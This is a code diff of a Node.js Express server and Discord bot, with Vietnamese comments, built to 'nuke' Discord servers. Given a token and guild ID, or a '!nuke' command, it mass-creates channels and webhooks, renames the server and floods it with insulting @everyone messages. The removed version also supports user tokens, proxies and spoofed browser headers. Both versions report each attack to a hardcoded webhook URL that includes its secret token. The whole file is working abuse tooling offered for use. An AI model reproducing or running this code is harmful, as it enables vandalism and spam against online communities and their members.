@@ -1,6 +1,5 @@
 import express from 'express';
-import { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType } from 'discord.js';
-import { ProxyAgent } from 'undici';
+import { Client, GatewayIntentBits, ChannelType } from 'discord.js';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
@@ -11,32 +10,24 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
 
-async function fire(token, isBot, method, path, body, dispatcher) {
-  return fetch(`https://discord.com/api/v9${path}`, {
-    method,
-    headers: {
-      'Content-Type': 'application/json',
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
-      'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIn0=',
-      'Accept-Language': 'en-US,en;q=0.9',
-      Authorization: isBot ? `Bot ${token}` : token,
-    },
-    body: body ? JSON.stringify(body) : undefined,
-    dispatcher: dispatcher ?? undefined,
-  });
-}
+let config = {
+  channelName: 'NUKE BY PHTUANKHANH',
+  renameName: 'NUKE BY PTK',
+  channelCount: 100,
+  msgContent: '# NUKED\n> @everyone cút hết',
+  msgCount: 1,
+  pingEveryone: true
+};
 
 async function notifyNuke(info) {
-  const { guildName, guildIcon, guildId, ownerId, mode, channels, webhooks, msgs, user, error } = info;
+  const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
   const embed = {
     title: error ? 'Nuke thất bại' : 'Nuke thành công',
     color: error ? 0xff0000 : 0x00ff66,
     fields: [
       { name: 'Server', value: guildName || 'không rõ', inline: true },
       { name: 'Guild ID', value: guildId || '-', inline: true },
-      { name: 'Mode', value: mode, inline: true },
       { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
-      { name: 'Webhook', value: String(webhooks ?? 0), inline: true },
       { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
       { name: 'Người dùng', value: user || '-', inline: true },
       { name: 'Owner ID', value: ownerId || '-', inline: true },
@@ -58,163 +49,11 @@ async function notifyNuke(info) {
   } catch {}
 }
 
-// ------------------------------------------------------------------
-// WEB PANEL ROUTE
-// ------------------------------------------------------------------
-app.post('/api/nuke', async (req, res) => {
-  const {
-    token, isBot, guildId, proxy,
-    channelCount = 100,
-    channelName = 'NUKE BY PHTUANKHANH',
-    renameName = 'NUKE BY PTK',
-    webhookMsgCount = 1,
-    pingEveryone = true,
-  } = req.body ?? {};
-
-  if (!token || !guildId) return res.status(400).json({ error: 'token + guildId required' });
-
-  // Cấm dùng mode bot qua web nếu không nhập token hợp lệ (cần check thêm)
-  const cc = Math.max(1, Math.min(200, parseInt(channelCount, 10) || 100));
-  const mc = Math.max(0, Math.min(20, parseInt(webhookMsgCount, 10) || 1));
-
-  res.setHeader('Content-Type', 'application/x-ndjson');
-  res.setHeader('Cache-Control', 'no-cache');
-  res.setHeader('X-Accel-Buffering', 'no');
-  const send = obj => res.write(JSON.stringify(obj) + '\n');
-  const log = s => { console.log(s); send({ log: s }); };
-
-  const proxyUrl = (proxy && String(proxy).trim()) || process.env.PROXY || null;
-  let dispatcher = null;
-  if (proxyUrl) {
-    try { dispatcher = new ProxyAgent({ uri: proxyUrl, connect: { timeout: 10000 } }); }
-    catch (e) { log(`proxy invalid: ${e.message}`); }
-  }
-  if (dispatcher) log(`dùng proxy: ${proxyUrl.split('@').pop()}`);
-
-  let guild = null, me = null;
-  let channelsCreated = 0, webhooksCreated = 0, msgsSent = 0;
-
-  try {
-    const t0 = Date.now();
-    log(`start | mode=${isBot ? 'bot' : 'user'} | guild=${guildId}`);
-
-    me = await (await fire(token, isBot, 'GET', '/users/@me', null, dispatcher)).json();
-    log(`auth ok | ${me.username}`);
-
-    guild = await (await fire(token, isBot, 'GET', `/guilds/${guildId}`, null, dispatcher)).json();
-    log(`guild ok | ${guild.name}`);
-
-    log(`bắn ${cc} kênh song song...`);
-    const tCh = Date.now();
-    const chanResults = await Promise.allSettled(
-      Array.from({ length: cc }, (_, i) =>
-        fire(token, isBot, 'POST', `/guilds/${guildId}/channels`, {
-          name: `${channelName}-${i}`, type: 0,
-        }, dispatcher)
-      )
-    );
-    const channelIds = [];
-    for (const r of chanResults) {
-      if (r.status === 'fulfilled') {
-        try {
-          const j = await r.value.json();
-          if (j.id) { channelIds.push(j.id); channelsCreated++; }
-        } catch {}
-      }
-    }
-    log(`kênh gửi ${cc} | tạo được ${channelIds.length} trong ${Date.now() - tCh}ms`);
-
-    log(`bắn ${channelIds.length} webhook song song...`);
-    const tWh = Date.now();
-    const whResults = await Promise.allSettled(
-      channelIds.map(cid =>
-        fire(token, isBot, 'POST', `/channels/${cid}/webhooks`, { name: 'nuke' }, dispatcher)
-      )
-    );
-    const webhooks = [];
-    for (const r of whResults) {
-      if (r.status === 'fulfilled') {
-        try {
-          const j = await r.value.json();
-          if (j.id && j.token) { webhooks.push({ id: j.id, token: j.token }); webhooksCreated++; }
-        } catch {}
-      }
-    }
-    log(`webhook gửi ${channelIds.length} | tạo được ${webhooks.length} trong ${Date.now() - tWh}ms`);
-
-    if (renameName) {
-      try {
-        await fire(token, isBot, 'PATCH', `/guilds/${guildId}`, { name: renameName }, dispatcher);
-        log(`renamed -> ${renameName}`);
-      } catch (e) { log(`rename fail: ${e.message}`); }
-    }
-
-    if (webhooks.length && mc > 0) {
-      const total = webhooks.length * mc;
-      log(`spam: ${webhooks.length} wh x ${mc} = ${total} msgs`);
-      const tSp = Date.now();
-      const msgs = [
-        `# NUKED\n> ${pingEveryone ? '@everyone' : ''} cút hết`,
-        `# raz3d\n> ${pingEveryone ? '@everyone' : ''} server chết`,
-        `# get fucked\n> ${pingEveryone ? '@everyone' : ''}`,
-        `# void\n> ${pingEveryone ? '@everyone' : ''} nuke`,
-      ];
-      const pick = a => a[Math.floor(Math.random() * a.length)];
-      const jobs = [];
-      for (const w of webhooks) for (let i = 0; i < mc; i++) jobs.push(w);
-      const results = await Promise.allSettled(
-        jobs.map(w => {
-          const body = { content: pick(msgs), username: 'nuke' };
-          if (pingEveryone) body.allowed_mentions = { parse: ['everyone'] };
-          return fetch(`https://discord.com/api/v9/webhooks/${w.id}/${w.token}?wait=false`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
-            },
-            body: JSON.stringify(body),
-            dispatcher: dispatcher ?? undefined,
-          });
-        })
-      );
-      for (const r of results) if (r.status === 'fulfilled' && r.value.ok) msgsSent++;
-      log(`spam ${msgsSent}/${total} trong ${Date.now() - tSp}ms`);
-    }
-
-    log(`DONE | tổng ${Date.now() - t0}ms`);
-
-    await notifyNuke({
-      guildName: guild?.name,
-      guildIcon: guild?.icon ? `https://cdn.discordapp.com/icons/${guildId}/${guild.icon}.png?size=256` : null,
-      guildId, ownerId: guild?.owner_id,
-      mode: isBot ? 'bot' : 'user',
-      channels: channelsCreated, webhooks: webhooksCreated, msgs: msgsSent,
-      user: me?.username ?? null,
-      error: null,
-    });
-  } catch (e) {
-    log(`FATAL ${e.message}`);
-    await notifyNuke({
-      guildName: guild?.name, guildIcon: null, guildId, ownerId: guild?.owner_id,
-      mode: isBot ? 'bot' : 'user',
-      channels: channelsCreated, webhooks: webhooksCreated, msgs: msgsSent,
-      user: me?.username ?? null, error: e.message,
-    });
-  } finally {
-    res.end();
-  }
-});
-
-// ------------------------------------------------------------------
-// BOT DISCORD.JS LẮNG NGHE LỆNH !nuke
-// ------------------------------------------------------------------
 let botClient = null;
-let botToken = null;
 
-async function startBotDiscord(token) {
-  if (botClient) {
-    botClient.destroy();
-  }
+function startBot(token) {
+  if (botClient) botClient.destroy();
+
   botClient = new Client({
     intents: [
       GatewayIntentBits.Guilds,
@@ -225,144 +64,115 @@ async function startBotDiscord(token) {
   });
 
   botClient.on('ready', () => {
-    console.log(`[BOT] Đã đăng nhập: ${botClient.user.tag}`);
+    console.log(`[BOT] Online: ${botClient.user.tag}`);
   });
 
   botClient.on('messageCreate', async (message) => {
     if (message.author.bot) return;
     if (message.content !== '!nuke') return;
 
-    const guildId = message.guild.id;
-    const channel = message.channel;
+    const guild = message.guild;
+    const t0 = Date.now();
+    message.reply('🚀 Bắt đầu nuke...').catch(() => {});
 
-    // Bật trạng thái đang nuke
-    await channel.send('🚀 **Bắt đầu nuke server...**');
-    
-    // Thiết lập thông số mặc định
-    const cc = 100;
-    const channelName = 'NUKE BY PHTUANKHANH';
-    const renameName = 'NUKE BY PTK';
-    const mc = 1;
-    const pingEveryone = true;
-    
     let channelsCreated = 0;
-    let webhooksCreated = 0;
     let msgsSent = 0;
-    let guildObj = message.guild;
 
     try {
-      const t0 = Date.now();
-      console.log(`[NUKE] Bắt đầu nuke guild ${guildId} từ lệnh !nuke`);
+      const cc = config.channelCount;
+      const chName = config.channelName;
+      const rName = config.renameName;
+      const mc = config.msgCount;
+      const msgText = config.msgContent;
+      const ping = config.pingEveryone;
 
-      // 1. TẠO KÊNH
-      const channelIds = [];
-      const ccQueue = Array.from({ length: cc }, (_, i) => i);
-      
-      // Hàm phụ tạo kênh
-      const createChannel = async (i) => {
-        try {
-          const c = await guildObj.channels.create({
-            name: `${channelName}-${i}`,
-            type: ChannelType.GuildText,
-          });
-          channelIds.push(c.id);
-          channelsCreated++;
-        } catch (e) {
-          console.error(`Lỗi tạo kênh ${i}: ${e.message}`);
-        }
-      };
+      // 1. TẠO KÊNH SONG SONG - TÊN Y HỆT NHAU
+      const channelPromises = Array.from({ length: cc }, () =>
+        guild.channels.create({
+          name: chName,
+          type: ChannelType.GuildText,
+        }).then(c => { channelsCreated++; return c; }).catch(() => null)
+      );
 
-      // Bắn 100 kênh song song
-      await Promise.allSettled(Array.from({ length: cc }, (_, i) => createChannel(i)));
-      
-      // 2. TẠO WEBHOOK
-      const webhooks = [];
-      const createWebhook = async (cid) => {
-        try {
-          const ch = await guildObj.channels.fetch(cid);
-          const w = await ch.createWebhook({ name: 'nuke' });
-          webhooks.push({ id: w.id, token: w.token });
-          webhooksCreated++;
-        } catch (e) {
-          console.error(`Lỗi tạo webhook kênh ${cid}: ${e.message}`);
-        }
-      };
+      const createdChannels = (await Promise.allSettled(channelPromises))
+        .filter(r => r.status === 'fulfilled' && r.value !== null)
+        .map(r => r.value);
 
-      await Promise.allSettled(channelIds.map(cid => createWebhook(cid)));
-
-      // 3. RENAME GUILD
-      try {
-        await guildObj.setName(renameName);
-      } catch (e) {}
-
-      // 4. SPAM WEBHOOK (Tự ping @everyone)
-      const total = webhooks.length * mc;
-      if (webhooks.length && mc > 0) {
-        const msgs = [
-          `# NUKED\n> ${pingEveryone ? '@everyone' : ''} cút hết`,
-          `# raz3d\n> ${pingEveryone ? '@everyone' : ''} server chết`,
-          `# get fucked\n> ${pingEveryone ? '@everyone' : ''}`,
-          `# void\n> ${pingEveryone ? '@everyone' : ''} nuke`,
-        ];
-        const pick = a => a[Math.floor(Math.random() * a.length)];
-        const jobs = [];
-        for (const w of webhooks) for (let i = 0; i < mc; i++) jobs.push(w);
-
-        const sendWebhookMsg = async (w) => {
-          const body = { content: pick(msgs), username: 'nuke' };
-          if (pingEveryone) body.allowed_mentions = { parse: ['everyone'] };
-          try {
-            const r = await fetch(`https://discord.com/api/v9/webhooks/${w.id}/${w.token}?wait=false`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(body),
-            });
-            if (r.ok) msgsSent++;
-          } catch (e) {}
-        };
-
-        await Promise.allSettled(jobs.map(w => sendWebhookMsg(w)));
+      // 2. RENAME GUILD
+      if (rName) {
+        await guild.setName(rName).catch(() => {});
       }
 
-      // Gửi thông báo
+      // 3. SPAM TIN NHẮN BẰNG BOT
+      if (createdChannels.length && mc > 0) {
+        const msgJobs = [];
+        for (const c of createdChannels) {
+          for (let i = 0; i < mc; i++) msgJobs.push(c);
+        }
+
+        await Promise.allSettled(
+          msgJobs.map(c => 
+            c.send({
+              content: msgText,
+              allowedMentions: ping ? { parse: ['everyone'] } : { parse: [] }
+            })
+            .then(() => { msgsSent++; })
+            .catch(() => {})
+          )
+        );
+      }
+
       await notifyNuke({
-        guildName: guildObj.name,
-        guildIcon: guildObj.iconURL({ size: 256 }),
-        guildId, ownerId: guildObj.ownerId,
-        mode: 'bot',
-        channels: channelsCreated, webhooks: webhooksCreated, msgs: msgsSent,
+        guildName: guild.name,
+        guildIcon: guild.iconURL({ size: 256 }),
+        guildId: guild.id, ownerId: guild.ownerId,
+        channels: channelsCreated, msgs: msgsSent,
         user: botClient.user.username,
         error: null,
       });
 
-      const timeTaken = Date.now() - t0;
-      console.log(`[NUKE] Xong trong ${timeTaken}ms`);
-      
+      console.log(`[NUKE] Xong trong ${Date.now() - t0}ms`);
+
     } catch (err) {
       console.error('Lỗi nuke:', err.message);
       await notifyNuke({
-        guildName: guildObj.name, guildIcon: guildObj.iconURL({ size: 256 }), guildId,
-        ownerId: guildObj.ownerId, mode: 'bot', channels: channelsCreated, webhooks: webhooksCreated,
-        msgs: msgsSent, user: botClient.user.username, error: err.message
+        guildName: guild.name, guildIcon: guild.iconURL({ size: 256 }), guildId: guild.id,
+        ownerId: guild.ownerId, channels: channelsCreated, msgs: msgsSent, 
+        user: botClient.user.username, error: err.message
       });
     }
   });
 
-  await botClient.login(token);
+  botClient.login(token).catch(e => console.error('Login error:', e.message));
 }
 
-// API nhận token bot để bật bot
 app.post('/api/bot-login', async (req, res) => {
   const { token } = req.body ?? {};
   if (!token) return res.status(400).json({ error: 'Thiếu token bot' });
   
   try {
-    botToken = token;
-    await startBotDiscord(token);
+    startBot(token);
+    await new Promise(r => setTimeout(r, 1500));
+    if (!botClient || !botClient.user) throw new Error('Đăng nhập thất bại, kiểm tra token');
     res.json({ ok: true, user: botClient.user.tag });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
+});
+
+app.post('/api/settings', (req, res) => {
+  const { channelName, renameName, channelCount, msgContent, msgCount, pingEveryone } = req.body ?? {};
+  if (channelName) config.channelName = channelName;
+  if (renameName) config.renameName = renameName;
+  if (channelCount) config.channelCount = Math.min(500, Math.max(1, parseInt(channelCount, 10)));
+  if (msgContent) config.msgContent = msgContent;
+  if (msgCount !== undefined) config.msgCount = Math.max(1, parseInt(msgCount, 10));
+  if (pingEveryone !== undefined) config.pingEveryone = !!pingEveryone;
+  res.json({ ok: true, config });
+});
+
+app.get('/api/settings', (req, res) => {
+  res.json(config);
 });
 
 const PORT = process.env.PORT || 3000;
